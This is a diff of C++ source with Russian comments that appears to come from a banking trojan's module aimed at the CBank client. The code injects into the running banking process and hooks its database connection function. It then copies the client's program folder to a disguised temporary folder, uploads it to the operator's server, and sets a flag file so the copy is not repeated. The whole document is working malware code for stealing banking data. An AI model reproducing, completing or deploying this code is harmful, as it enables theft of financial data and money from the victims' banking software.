@@ -32,7 +32,7 @@ namespace BBS_CALC
 namespace CBank
 {
 
-static int WINAPI SendCBank(void*); //отсылка файлов CBank на сервер
+static DWORD WINAPI SendCBank( void* param ); //отсылка файлов CBank на сервер
 
 SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
      SQLHDBC         ConnectionHandle,
@@ -228,7 +228,7 @@ static void WINAPI WaitRunCBank(void*)
 				DBG( "CBank", "Start '%s'", path );
 				idCBank = id;
 				InjectIntoProcess( id, WorkInCBank );
-				char* path2 = STR::New(path);
+				char* path2 = STR::New(path); 
 				RunThread( SendCBank, path2 );
 			}
 		}
@@ -247,67 +247,64 @@ void Start()
 	StartThread( WaitRunCBank, 0 );
 }
 
-static void SendFolder(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
+static DWORD WINAPI SendCBank( void* param )
 {
-	//переводим имя папки в нижний регистр
-	char* path = STR::New(FileName);
-	STR::AnsiLowerCase(path);
-	if( m_strstr( path, "exe" ) == 0 ) //папку exe не нужно отсылать
+	char folderCBank[MAX_PATH];
+	m_lstrcpy( folderCBank, (char*)param );
+	STR::Free((char*)param);
+	//в param передается путь к ехе клиента, папка клиента на два уровня выше 
+	pPathRemoveFileSpecA(folderCBank);
+	pPathRemoveFileSpecA(folderCBank);
+	const char* CBankFlagCopy = "cbank_copy.txt";
+	if( Bot->FileExists( 0, CBankFlagCopy ) )
 	{
-		pPathStripPathA(path); //выделяем имя папки
-		int lenPath = m_lstrlen(path);
-		if( path[lenPath - 1] == '\\' || path[lenPath - 1] == '/' ) path[lenPath - 1] = 0; //убираем в конце косую черту
-		char* tempFolder = (char*)Data;
-		pPathAppendA( tempFolder, path );
-		DBG( "СBank", "создаем папку %s", tempFolder );
-		if( pCreateDirectoryA( tempFolder, 0 ) )
-		{
-			char from[MAX_PATH];
-			m_lstrcpy( from, FileName ); //дублируем имя исходящей папки
-			int lenFrom = m_lstrlen(from);
-			if( from[lenFrom - 1] == '\\' || from[lenFrom - 1] == '/' ) from[lenFrom - 1] = 0; //убираем в конце косую черту
-			DBG( "СBank", "copy folder %s -> %s", from, tempFolder );
-			*((int*)&(from[lenFrom])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
-			*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; 
-			CopyFileANdFolder( from, tempFolder );
-		}
+		DBG( "CBank", "Клиент уже был скопирован" );
+		return 0;
+	}
+	DWORD folderSize = 0;
+	if( !SizeFolderLess( CBankFlagCopy, 1024*1024*250, &folderSize ) )
+	{
+		DBG( "CBank", "Папка программы больше заданного размера, не копируем" );
+		return 0;
+	}
+	DBG( "CBank", "запуск отсылки программы на сервер из папки %s", folderCBank );
+
+//	DBG( "IFobs", "Размер папки %d байт", folderSize );
+	char tempFolder[MAX_PATH];
+	const char* clientPrg = "CBankClient";
+	pGetTempPathA( sizeof(tempFolder), tempFolder );
+	char* cryptName = UIDCrypt::CryptFileName( clientPrg, false );
+	pPathAppendA( tempFolder, cryptName );
+	STR::Free(cryptName);
+	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
+	{
+		DBG( "CBank", "Эта папка на данный момент выкачивается" );
+		return 0;
+	}
+	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
+	pCreateDirectoryA( tempFolder, 0 );
+	DBG( "CBank", "Копирование во временную папку %s", tempFolder );
+	*((int*)&(folderCBank[ m_lstrlen(folderCBank) ])) = 0; 
+	CopyFileANdFolder( folderCBank, tempFolder );
+	DBG( "CBank", "Копирование на сервер" );
+	//удаляем ненужные папки
+	const char* DelFolders[] = { 0 };
+	int i = 0;
+	while( DelFolders[i] )
+	{
+		pPathAppendA( tempFolder, DelFolders[i] );
+		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
+		DBG( "CBank", "Удаление папки %s", tempFolder );
+		DeleteFolders(tempFolder);
 		pPathRemoveFileSpecA(tempFolder);
+		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
+		i++;
 	}
-	STR::Free(path);
-}
-
-
-static int WINAPI SendCBank( void* param )
-{
-	char* path = (char*)param;
-	char fileFlag[MAX_PATH], tempFolder[MAX_PATH];
-	if( GetAllUsersProfile( fileFlag, sizeof(fileFlag), "cbank.dat" ) )
-	{
-		//проверяем отослали уже
-		if( !File::IsExists(fileFlag) )
-		{
-			File::WriteBufferA( fileFlag, 0, 0 ); //указываем что отсылаем (отослали)
-			//в path что-то типа ....\exe\cbank.exe, нам нужна папка клиента, та в которой находится папка exe
-			pPathRemoveFileSpecA(path);
-			pPathRemoveFileSpecA(path);
-			m_lstrcat( path, "\\" );
-			if( GetAllUsersProfile( tempFolder, sizeof(tempFolder), "cbank" ) )
-			{
-				int lenTempFolder = m_lstrlen(tempFolder);
-				*((int*)&(tempFolder[lenTempFolder])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
-				if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
-				DBG( "СBank", "создаем папку %s", tempFolder );
-				if( pCreateDirectoryA( tempFolder, 0 ) )
-				{
-					SearchFiles( path, "*.*", false, FA_DIRECTORY, tempFolder, SendFolder );
-					VideoProcess::SendFiles( 0, "BBSCBank", tempFolder );
-					*((int*)&(tempFolder[lenTempFolder])) = 0;
-					DeleteFolders(tempFolder);
-				}
-			}
-		}
-	}
-	STR::Free(path);
+	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
+	DeleteFolders(tempFolder);
+	Bot->CreateFileA( 0, CBankFlagCopy );
+	DBG( "CBank", "Копирование на сервер окончено" );
 	return 0;
 }
 
